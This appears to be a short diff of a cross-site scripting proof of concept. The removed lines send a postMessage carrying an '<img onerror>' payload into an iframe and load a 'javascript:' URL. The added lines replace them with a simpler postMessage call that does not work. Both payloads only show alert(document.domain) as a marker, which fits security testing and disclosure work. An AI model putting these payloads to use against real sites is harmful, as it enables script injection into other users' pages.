@@ -1,13 +1,4 @@
+<iframe id="frame" src="#"></iframe>
 <script>
-  window.onload = function()
-  {
-    var frame = document.getElementById("frame");
-    frame.contentWindow.postMessage({
-      type: "forward",
-      event: "ajaxSuccess",
-      selector: "<img src=x onerror=alert(document.domain)>",
-      recipient: "\x70\x10\x10\x10\x10\u6161\u6100\u7373"
-    }, "*");
-  };
+document.getElementById("frame").postMessage(alert(document.domain));
 </script>
-<iframe id="frame" src="javascript:alert(document.domain)"></iframe>
